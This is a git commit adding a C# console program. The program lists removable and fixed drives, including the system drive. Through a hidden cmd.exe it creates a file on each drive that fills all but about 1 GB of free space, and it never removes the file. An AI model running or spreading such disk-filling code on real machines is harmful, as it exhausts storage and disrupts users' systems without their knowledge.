2c6f2d8484953e46ec2701fd77ad7d8820fc59a3
PTA00 <2762171125@qq.com>
2022-03-06 17:33:17 +0800

    添加项目文件。

---
+++ ConsoleApp3/Program.cs
@@ -0,0 +1,108 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+using static System.Console;
+using System.Management;//需要手动添加程序集的引用，这里的引用不是指命名空间的导入！
+using System.Diagnostics;
+
+namespace ConsoleApp3
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Program aa = new Program();
+            foreach (string s in aa.GetRemovableDeviceID())
+            {
+                long freespace = aa.GetHardDiskSpace(s);
+                //WriteLine(s + " " + (freespace - 1) + " GB");//向下取整并-1GB
+                system("fsutil file createnew " + s + "\\1.temp " + (freespace - 1) * (1024 * 1024 * 1024));
+            }
+
+            
+
+            ReadKey();
+        }
+
+        //单位GB
+        public long GetHardDiskSpace(string str_HardDiskName)
+        {
+            long totalSize = 0;
+            str_HardDiskName = str_HardDiskName + "\\";
+            DriveInfo[] drives = DriveInfo.GetDrives();
+            foreach (DriveInfo drive in drives)
+            {
+                if (drive.Name == str_HardDiskName)
+                {
+                    totalSize = drive.TotalFreeSpace / (1024 * 1024 * 1024);
+                }
+            }
+            return totalSize;
+        }
+
+
+        public List<string> GetRemovableDeviceID()
+        {
+            List<string> deviceIDs = new List<string>();
+            ManagementObjectSearcher query = new ManagementObjectSearcher("SELECT  *  From  Win32_LogicalDisk ");
+            ManagementObjectCollection queryCollection = query.Get();
+            foreach (ManagementObject mo in queryCollection)
+            {
+
+                switch (int.Parse(mo["DriveType"].ToString()))
+                {
+                    case (int)DriveType.Removable:   //可以移动磁盘     
+                        {
+                            //MessageBox.Show("可以移动磁盘");
+                            deviceIDs.Add(mo["DeviceID"].ToString());
+                            break;
+                        }
+                    case (int)DriveType.Fixed:   //本地磁盘     
+                        {
+                            //MessageBox.Show("本地磁盘");
+                            deviceIDs.Add(mo["DeviceID"].ToString());
+                            break;
+                        }
+                    default:   //defalut   to   folder     
+                        {
+                            //MessageBox.Show("驱动器类型未知 ");
+                            break;
+                        }
+                }
+
+            }
+            return deviceIDs;
+        }
+
+        public static string system(string strInput)
+        {
+            Process p = new Process();
+            //设置要启动的应用程序
+            p.StartInfo.FileName = "cmd.exe";
+            //是否使用操作系统shell启动
+            p.StartInfo.UseShellExecute = false;
+            // 接受来自调用程序的输入信息
+            p.StartInfo.RedirectStandardInput = true;
+            //输出信息
+            p.StartInfo.RedirectStandardOutput = true;
+            // 输出错误
+            p.StartInfo.RedirectStandardError = true;
+            //不显示程序窗口
+            p.StartInfo.CreateNoWindow = true;
+            //启动程序
+            p.Start();
+            //向cmd窗口发送输入信息
+            p.StandardInput.WriteLine(strInput + "&exit");
+            p.StandardInput.AutoFlush = true;
+            //获取输出信息
+            string strOuput = p.StandardOutput.ReadToEnd();
+            //等待程序执行完退出进程
+            p.WaitForExit();
+            p.Close();
+            return strOuput;
+        }
+    }
+}
